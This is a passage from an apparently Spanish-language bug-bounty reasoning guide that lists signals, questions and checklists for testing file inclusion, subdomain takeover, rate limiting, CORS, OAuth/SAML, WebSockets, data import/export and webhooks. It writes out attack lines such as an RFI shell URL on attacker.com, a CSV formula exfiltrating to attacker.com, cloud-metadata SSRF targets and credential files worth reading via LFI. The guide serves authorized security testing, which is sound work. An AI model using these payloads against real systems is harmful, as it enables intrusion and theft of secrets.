3. **¿Es Local File Inclusion (LFI) o Remote File Inclusion (RFI)?**
   - LFI: lee archivos del servidor → `/etc/passwd`, `/proc/self/environ`
   - RFI: incluye URLs remotas → `http://attacker.com/shell.txt`
   - PHP: `allow_url_include = On` necesario para RFI

4. **¿El ZIP/TAR upload tiene Zip Slip?**
   - Entry con path `../../etc/cron.d/shell` → escritura fuera del directorio destino
   - ¿Qué pasa con paths absolutos en el archive? `/etc/passwd`

5. **¿Qué archivos son útiles si hay LFI?**
   - `/etc/passwd` → usuarios del sistema
   - `/proc/self/environ` → variables de entorno con secrets
   - `/proc/self/cmdline` → comando de inicio de la app
   - Archivos de config de la app → credenciales de DB
   - SSH keys → `/home/user/.ssh/id_rsa`

### Genera checklist si:
- Parámetro de archivo acepta `../` → checklist LFI con targets de alto valor
- ZIP upload → checklist Zip Slip
- PHP con `allow_url_include` → checklist RFI

---

## 17. SUBDOMAIN Y DNS

### Señales que activan este razonamiento
- CNAME que apunta a un servicio externo (GitHub Pages, S3, Heroku, Fastly, etc.)
- NS delegation a una cuenta externa
- Dominio referenciado desde el target que no existe o está expirado
- SPF/DMARC ausente o mal configurado
- Registros A/AAAA a IPs no controladas por la organización

### Preguntas de razonamiento

1. **¿El CNAME apunta a un servicio que no está reclamado?**
   - GitHub Pages: `username.github.io` → ¿existe ese usuario/repo?
   - S3: `bucket.s3.amazonaws.com` → ¿existe ese bucket?
   - Heroku: `app.herokuapp.com` → ¿existe esa app?
   - Azure: `app.azurewebsites.net` → ¿existe ese sitio?
   - Verificar con `dig CNAME subdomain.target.com` + intentar reclamar el recurso

2. **¿Hay dangling records?**
   - A/AAAA a IP que ya no pertenece a la organización → verificar en WHOIS/RDAP si la IP es del target
   - MX a dominio expirado → reclamar el dominio → interceptar emails

3. **¿El SPF/DMARC es débil?**
   - Sin SPF → email spoofing trivial
   - SPF con `~all` (softfail) en vez de `-all` (hardfail) → spoofing posible
   - Sin DMARC → spoofing efectivo aunque SPF esté bien
   - DMARC con `p=none` → solo reporta, no bloquea

4. **¿Hay recursos externos referenciados desde el target?**
   - JS cargado desde CDN/dominio externo que expiró → script injection
   - Imágenes/fuentes desde dominio expirado → resource takeover
   - iframe desde dominio externo no reclamado → content injection

### Genera checklist si:
- CNAME a servicio externo no reclamado → checklist subdomain takeover por servicio
- Dominio expirado referenciado → intentar registrar el dominio
- Sin DMARC/SPF → documentar como P4, evaluar si permite phishing de alta credibilidad

---

## 18. RATE LIMITING Y ENUMERACIÓN

### Señales que activan este razonamiento
- Endpoint de login
- Endpoint de reset de password
- Endpoint de verificación de OTP/2FA
- Endpoint de verificación de email/phone
- Endpoint de registro
- Respuestas diferentes para usuario existente vs no existente

### Preguntas de razonamiento

1. **¿Hay user enumeration?**
   - Login: ¿"usuario no existe" vs "contraseña incorrecta" son mensajes distintos?
   - Reset: ¿"email no registrado" vs "email enviado"?
   - Timing: ¿la respuesta tarda más cuando el usuario existe (bcrypt comparison)?
   - Registro: ¿"email ya en uso"?

2. **¿Hay rate limiting real?**
   - ¿Después de N intentos hay lockout o captcha?
   - ¿El rate limit es por IP? → bypasseable con `X-Forwarded-For`
   - ¿El rate limit es por cuenta? → distributed brute force desde IPs distintas
   - ¿El rate limit se resetea con el tiempo? → low-and-slow attack

3. **¿El OTP/2FA es débil?**
   - OTP de 4-6 dígitos → espacio de búsqueda pequeño
   - Sin expiración del OTP → intentos ilimitados en el tiempo
   - Sin rate limit en OTP → brute force directo
   - OTP predecible (basado en timestamp, secuencial)

4. **¿El captcha es bypasseable?**
   - ¿Solo client-side? → no enviarlo en el request
   - ¿Token reutilizable? → resolver una vez, reusar
   - ¿Audio captcha? → OCR/accesibilidad

### Genera checklist si:
- Respuestas distintas para usuario existente/no existente → documentar user enumeration
- Sin rate limit en login → documentar, NO hacer brute force (fuera de scope usualmente)
- OTP sin rate limit → checklist OTP brute force (con autorización explícita)

---

## 19. CORS

### Señales que activan este razonamiento
- Header `Access-Control-Allow-Origin` en responses
- Requests con `Origin:` header que el servidor procesa
- Endpoints de API con datos sensibles
- `Access-Control-Allow-Credentials: true`

### Preguntas de razonamiento

1. **¿El servidor refleja el Origin arbitrariamente?**
   - `Origin: https://attacker.com` → `Access-Control-Allow-Origin: https://attacker.com` con `credentials: true` → CORS crítico

2. **¿Acepta `null` origin?**
   - `Origin: null` → `Access-Control-Allow-Origin: null` → explotable desde iframe sandbox

3. **¿La validación de origin tiene prefix/suffix match débil?**
   - `Origin: https://target.com.attacker.com` → ¿lo acepta? (suffix match)
   - `Origin: https://attackertarget.com` → ¿lo acepta? (substring match)
   - `Origin: https://sub.target.com` → ¿acepta subdominios? → XSS en sub → CORS bypass

4. **¿`*` con credentials?**
   - `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` → inválido en spec pero algunos frameworks lo implementan mal

5. **¿Los endpoints con CORS permisivo tienen datos sensibles?**
   - CORS misconfiguration solo importa si el endpoint retorna datos que no deberían ser públicos
   - CORS en endpoint público sin datos sensibles → no es un hallazgo real

### Genera checklist si:
- Origin reflejado + credentials → PoC con fetch desde origen externo
- `null` origin aceptado + credentials → PoC con iframe sandbox
- Subdominios aceptados → buscar XSS en subdominios para chain

---

## 20. OAUTH Y SSO

### Señales que activan este razonamiento
- Botón "Login con Google/Facebook/GitHub/Apple"
- Parámetros `client_id`, `redirect_uri`, `response_type`, `state`, `code`, `nonce`
- Endpoints `/oauth/authorize`, `/oauth/token`, `/saml/acs`, `/saml/sso`
- JWTs con `iss` claim externo
- SAML assertions en requests/responses

### Preguntas de razonamiento

1. **¿El `redirect_uri` tiene validación estricta?**
   - ¿Solo acepta URIs exactas registradas? → seguro
   - ¿Acepta prefix match? → `https://target.com/callback/../evil` o `https://target.com.attacker.com`
   - ¿Acepta wildcard en subdominio? → XSS en cualquier subdominio → token theft

2. **¿Hay parámetro `state`?**
   - Sin `state` → CSRF en OAuth (forzar login con cuenta del atacante)
   - `state` fijo → idem
   - `state` aleatorio pero no validado → idem

3. **¿Hay PKCE?**
   - Sin PKCE en public clients → authorization code interception
   - PKCE con `code_challenge_method=plain` en vez de `S256` → más débil

4. **¿El `code` tiene las protecciones correctas?**
   - ¿Expira rápido (< 5 min)?
   - ¿Se invalida después del primer uso?
   - ¿Está en la URL? → leak en Referer/logs del servidor del atacante

5. **¿El JWT del IdP se valida correctamente?**
   - ¿Se verifica la firma?
   - ¿Se verifica `iss`? → IdP confusion si no
   - ¿Se verifica `aud`? → token para otra app usado en esta
   - ¿Se verifica `exp`?

6. **¿El account linking es seguro?**
   - ¿Se puede vincular una cuenta OAuth a una cuenta existente sin verificar la cuenta existente?
   - ¿Se puede tomar una cuenta vinculando la cuenta OAuth del atacante a la cuenta víctima?

7. **¿SAML valida las firmas?**
   - XML signature wrapping → firmar un nodo inocente, envolver la assertion maliciosa
   - Comment injection: `admin<!---->@target.com` vs `admin@target.com`
   - `NameID` manipulation sin verificación de firma

### Genera checklist si:
- `redirect_uri` con validación laxa → checklist OAuth redirect bypass
- Sin `state` → PoC CSRF OAuth
- JWT sin validación de `iss`/`aud` → checklist JWT claims confusion
- SAML presente → checklist XML signature wrapping

---

## 21. WEBSOCKETS Y SSE

### Señales que activan este razonamiento
- `ws://` o `wss://` en JS del frontend
- `new WebSocket(...)` en código JS
- `EventSource` / `new EventSource(...)` (SSE)
- Endpoint `/ws`, `/socket`, `/events`, `/stream`
- Headers `Upgrade: websocket` en requests

### Preguntas de razonamiento

1. **¿El handshake WebSocket valida el Origin?**
   - El handshake HTTP incluye `Origin` header
   - Si el servidor no valida → cualquier origen puede abrir WebSocket → CSWSH (Cross-Site WebSocket Hijacking)
   - Si hay cookies de sesión sin `SameSite` → la sesión se envía en el handshake cross-site

2. **¿Los mensajes del WebSocket requieren auth?**
   - ¿Solo el handshake está autenticado o también los mensajes?
   - ¿Se puede enviar mensajes de otro usuario cambiando un ID en el payload?

3. **¿El contenido de los mensajes se refleja en el DOM sin sanitizar?**
   - WebSocket message → `innerHTML` → XSS stored via WebSocket

4. **¿El ID de canal/room es predecible?**
   - `wss://target.com/ws/room/1234` → enumerable → escucha mensajes de otros usuarios

5. **¿El endpoint SSE requiere auth?**
   - SSE stream con datos sensibles sin auth → information disclosure
   - ¿El stream es compartido entre usuarios?

### Genera checklist si:
- Sin validación de Origin en handshake + cookies sin SameSite → PoC CSWSH
- ID de canal predecible → intentar acceder a canales de otros usuarios
- Mensajes reflejados en DOM → checklist XSS via WebSocket

---

## 22. IMPORT/EXPORT Y PROCESAMIENTO DE DATOS

### Señales que activan este razonamiento
- Import de CSV/Excel/JSON/XML
- Export a CSV/Excel/PDF
- Conversión de documentos (HTML→PDF, URL→screenshot, Word→PDF)
- Procesamiento de imágenes (resize, thumbnail, OCR)
- Procesamiento de audio/video
- QR code generation/reading
- Generación de reportes

### Preguntas de razonamiento

1. **¿El CSV/Excel se abre en Excel/LibreOffice por usuarios?**
   - Campos con `=`, `+`, `-`, `@` al inicio → CSV injection / formula injection
   - `=HYPERLINK("http://attacker.com","click")` en campos exportados
   - Impacto: exfiltración cuando el admin abre el CSV

2. **¿La conversión HTML→PDF hace fetch de recursos?**
   - Headless Chrome/wkhtmltopdf para convertir HTML → SSRF si se puede inyectar `<img src="http://169.254.169.254/">`
   - ¿Se puede inyectar HTML en el contenido que se convierte?

3. **¿El procesamiento de imágenes usa librerías vulnerables?**
   - ImageMagick → política de seguridad, MVG/SVG payload
   - Pillow → vulnerabilidades históricas en parsers de formato
   - FFmpeg → SSRF via HLS playlist `#EXT-X-KEY:URI="http://attacker.com/"`

4. **¿El XML importado procesa entidades externas?**
   - XML import → XXE → LFI/SSRF
   - Excel (XLSX) contiene XML internamente → XXE en upload de Excel

5. **¿El QR code importado se procesa sin sanitizar?**
   - QR con `javascript:alert(1)` como URL → ¿se renderiza como link?
   - QR con comandos si se usa en contexto de automatización

### Genera checklist si:
- Export a CSV/Excel que usuarios (especialmente admins) abren → checklist CSV injection
- Conversión HTML→PDF con input del usuario → checklist SSRF via PDF
- Import de XML/Excel → checklist XXE
- Procesamiento de imágenes con ImageMagick → checklist ImageTragick

---

## 23. NOTIFICACIONES Y WEBHOOKS

### Señales que activan este razonamiento
- Configuración de webhook con URL controlada por el usuario
- "Test webhook" button
- Notificaciones push con payload configurable
- Integraciones con Slack/Teams/Discord configurables
- Alertas con URL de callback

### Preguntas de razonamiento

1. **¿La URL del webhook se valida antes de hacer el fetch?**
   - Sin validación → SSRF via webhook
   - ¿Acepta `http://169.254.169.254/`? → metadata cloud
   - ¿Acepta `http://localhost/internal`? → servicios internos

2. **¿El "test webhook" hace el fetch server-side o client-side?**
   - Server-side → SSRF
   - Client-side → solo útil para ver la request que se armaría

3. **¿El payload del webhook incluye datos del usuario sin sanitizar?**
   - Si el payload llega al Slack/Teams del atacante → information disclosure
   - Si el payload se refleja en la respuesta del servidor → reflexión peligrosa

4. **¿El secret de validación del webhook es predecible o ausente?**
   - Sin secret → cualquiera puede hacer POST al endpoint del receptor y simular eventos
   - Secret fijo (hardcodeado en docs) → idem

5. **¿Hay replay protection?**
   - Sin timestamp + firma → el mismo webhook se puede reenviar indefinidamente
   - Operaciones idempotentes → sin impacto; operaciones con efecto → replay attack

### Genera checklist si:
- URL de webhook configurable → OOB primero, luego SSRF a internos
- Sin validación de secret → checklist webhook spoofing
- Payload refleja datos de usuario → revisar qué datos

---

## Regla de cierre

**Antes de marcar cualquier lead como MUERTO**, responder:
1. ¿Probé la señal en todos los contextos donde aparece (no solo el primer endpoint)?
2. ¿Hay otro lead ya documentado con el que esto se puede combinar?
3. ¿La barrera es "requiere auth" → ¿hay forma de obtener auth? (registro self-service, SSO del programa, cuentas de prueba)
4. ¿La tecnología detectada tiene CVEs recientes que no están en mi lista?

Si alguna respuesta es "no lo revisé" → no está muerto, está pendiente.
